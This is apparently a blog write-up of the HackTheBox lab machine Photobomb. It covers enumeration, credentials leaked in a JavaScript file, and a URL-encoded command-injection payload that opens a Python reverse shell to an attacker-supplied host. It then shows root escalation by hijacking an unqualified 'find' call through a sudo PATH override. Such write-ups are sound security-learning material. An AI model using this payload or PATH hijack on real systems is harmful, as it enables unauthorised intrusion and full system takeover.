---
title: "CTF Writeup: HTB - Photobomb"
categories:
  - CTF
  - Writeup
---

The HackTheBox weekly machine named Photobomb was relatively easy to exploit. 

The first step involved discovering the login credentials by analyzing a JavaScript file. Once I gained access to an image manipulation panel using the credentials, I identified a command injection vulnerability and leveraged it to obtain execution and a shell. The privilege escalation phase was accomplished by executing a script as root, and there were two ways to achieve this. The first method involved exploiting a find command that was called without the full path, while the second method involved taking advantage of a disabled Bash builtin.

The machine [HTB - Photobomb](https://app.hackthebox.com/machines/500)


## Enumeration

```bash
┌──(root㉿kali)-[~]
└─# nmap -sV -sC 10.10.11.182
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-27 21:53 EST
Nmap scan report for 10.10.11.182
Host is up (0.028s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.83 seconds
```

Looks like ports [22, 80] are Open.

To take a look at T80 we should add our an entry to `/etc/hosts`.
```
┌──(root㉿kali)-[~]
└─# echo "10.10.11.182 photobomb.htb" >>/etc/hosts
```

![image](https://user-images.githubusercontent.com/29680216/221742245-98cf98fe-9d8f-47b1-8d36-abcaf89a3d63.png)

Clicking the `click here!` redirects to a page `/printer` which requires creds.

![image](https://user-images.githubusercontent.com/29680216/221742383-a7ee84aa-b3cb-4ee0-9ff3-0ec9d2633c34.png)

Manually inputing some creds showed no promise, but looking at the page source it looks to have a script it loads at the beginning of the page: `photobomb.js`.

Source: `photobomb.js`

![image](https://user-images.githubusercontent.com/29680216/221743317-817dd3e5-77e3-4eb5-8791-b33e6876127b.png)

Looks there's a possible username/password in the href.

![image](https://user-images.githubusercontent.com/29680216/221743975-e884e8a4-86c1-4c96-8258-b33b06139b7e.png)

Opening that URL looks to have let us login to the page.

![image](https://user-images.githubusercontent.com/29680216/221744204-3b16a0a9-8c48-4f74-a0ed-380b45a00b37.png)

Seems to have nothing of interest, but at the bottom there's a section for downloading an image.

![image](https://user-images.githubusercontent.com/29680216/221744437-e3a4b29a-8812-4b7e-93eb-55728b3e2561.png)

Using Burp Suite we can intercept when seeing what this button does.

![image](https://user-images.githubusercontent.com/29680216/221745177-15fb505c-8d94-4cad-95a8-2070664d309d.png)


## Exploitation

Using the below payload injection seems we were able to establish a shell.
- `[LHOST]` your local host.
- `[LPORT]` your local port.

```
%3bexport+RHOST%3d"[LHOST]"%3bexport+RPORT%3d[LPORT]%3bpython3+-c+'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn("sh")'
```

Before sending the payload, ensure you're listening on the port above.

![image](https://user-images.githubusercontent.com/29680216/221747141-ae1063aa-9692-4d98-95c5-d4063fcbe7cf.png)

Bingo.

![image](https://user-images.githubusercontent.com/29680216/221747683-4ecaa6d7-6073-4687-9538-062c02926472.png)

Now we need to get ourselves a shell, so we must spawn one.

```
$ python3 -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
wizard@photobomb:~/photobomb$ 
```

Bet. Now that we have a user shell, looks that we have a our first flag.

```
wizard@photobomb:~/photobomb$ ls ~/
ls ~/
photobomb  user.txt
wizard@photobomb:~/photobomb$ cat ~/user.txt    
cat ~/user.txt
a43c08bd49e712707dc3b67c766371d2
```

Now... Let's see what permissions we're working with.

```
wizard@photobomb:~/photobomb$ sudo -l
sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
wizard@photobomb:~/photobomb$ 
```

It looks like there's a script we can run as root: `/opt/cleanup.sh`. Seems we have read rights to view the contents of the script.

```
wizard@photobomb:~/photobomb$ ls -la /opt/cleanup.sh
ls -la /opt/cleanup.sh
-r-xr-xr-x 1 root root 340 Sep 15 12:11 /opt/cleanup.sh
```

Taking a peak that the scripts contents 

```
wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh
cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

We can try to overwrite the `find` script and bypass roots `PATH` so that it uses our modfied script to give us a root shell.
```
wizard@photobomb:~/photobomb$ echo "bash" > find
echo "bash" > find
wizard@photobomb:~/photobomb$ chmod +x find
chmod +x find
wizard@photobomb:~/photobomb$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
sudo PATH=$PWD:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# 
```

Solid. Now we have the root flag.

```
root@photobomb:/home/wizard/photobomb# ls ~/
ls ~/
root.txt
root@photobomb:/home/wizard/photobomb# cat ~/root.txt   
cat ~/root.txt
78dfb63bc7a8d3a0ddd4a6495c723c86
root@photobomb:/home/wizard/photobomb# 
```


## Conclusion

This was a fun box. I enjoyed the manual enumeration and the exploitation. I'm not sure if this was intended, but I was able to get a root shell without having to modify the `find` script. I was able to overwrite the `find` script and then run the `sudo` command with the `PATH` set to the current directory. This allowed me to run my modified `find` script and get a root shell.

Lastly, **Hack the Planet**!